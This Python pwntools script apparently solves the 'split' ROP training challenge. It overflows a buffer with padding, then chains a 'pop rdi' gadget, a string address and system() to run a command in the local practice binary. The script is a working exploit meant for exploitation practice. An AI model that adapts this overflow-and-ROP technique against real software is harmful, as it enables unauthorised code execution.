#/usr/bin/env python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('split')
io = process(elf.path)

# pwntools can build our rop chain for us
rop = ROP(elf)
rop.raw(0x0000000000400883) # pop rdi; ret
rop.raw(elf.symbols['usefulString']) # address for usefulString
rop.raw(elf.symbols['system']) # address for syscall
print (rop.dump())

# inject our needed A's and then build the ropchain
exploit = b'A'*0x28 + rop.chain()
exploit += b'B' * (0x60 - len(exploit))

# interact with the process
io.send(exploit)
io.wait()
